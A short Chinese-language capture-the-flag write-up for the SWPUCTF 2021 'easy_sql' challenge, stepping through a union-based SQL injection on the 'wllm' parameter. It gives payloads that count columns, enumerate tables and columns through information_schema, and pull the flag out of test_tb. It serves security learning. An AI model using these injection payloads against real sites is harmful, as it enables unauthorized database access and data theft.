# [SWPUCTF 2021 新生赛]easy_sql


# [SWPUCTF 2021 新生赛]easy_sql

> 一道简单不过的联合注入题，水一下文章数

![[SWPUCTF 2021 新生赛]easy_sql-1](https://pic.imgdb.cn/item/65367994c458853aeffd2420.jpg)

查看页面源码，得到参数名

![[SWPUCTF 2021 新生赛]easy_sql-2](https://pic.imgdb.cn/item/653679d3c458853aeffe0d17.jpg)

尝试用GET给wllm参数传个1

![[SWPUCTF 2021 新生赛]easy_sql-3](https://pic.imgdb.cn/item/65367a07c458853aeffece75.jpg)

`?wllm=1'`页面报错，存在注入点

![[SWPUCTF 2021 新生赛]easy_sql-4](https://pic.imgdb.cn/item/65367b9ac458853aef04a68b.jpg)

`?wllm=1'--+`页面恢复正常，为字符型

![[SWPUCTF 2021 新生赛]easy_sql-5](https://pic.imgdb.cn/item/65367c5ac458853aef079062.jpg)

`?wllm=1'order by 3--+`页面正常，`?wllm=1'order by 4--+`页面报错，有3个字段

![[SWPUCTF 2021 新生赛]easy_sql-6](https://pic.imgdb.cn/item/65367c78c458853aef080498.jpg)

`?wllm=-1'union select 1,2,3--+`得到回显点

![[SWPUCTF 2021 新生赛]easy_sql-7](https://pic.imgdb.cn/item/65367ceec458853aef09ce1c.jpg)

`?wllm=-1'union select 1,database(),3--+`得到数据库名test_db

![[SWPUCTF 2021 新生赛]easy_sql-8](https://pic.imgdb.cn/item/65367d7ec458853aef0cfe5f.jpg)

```sql
?wllm=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema="test_db"--+
```

得到表名test_tb,users

![[SWPUCTF 2021 新生赛]easy_sql-9](https://pic.imgdb.cn/item/65367ed2c458853aef11f27e.jpg)

```sql
?wllm=-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name="test_tb"--+
```

得到字段名id,flag

![[SWPUCTF 2021 新生赛]easy_sql-10](https://pic.imgdb.cn/item/6536807ec458853aef18a219.jpg)

`?wllm=-1'union select 1,flag,3 from test_tb--+`得到flag

![[SWPUCTF 2021 新生赛]easy_sql-11](https://pic.imgdb.cn/item/653680dac458853aef19ff6f.jpg)
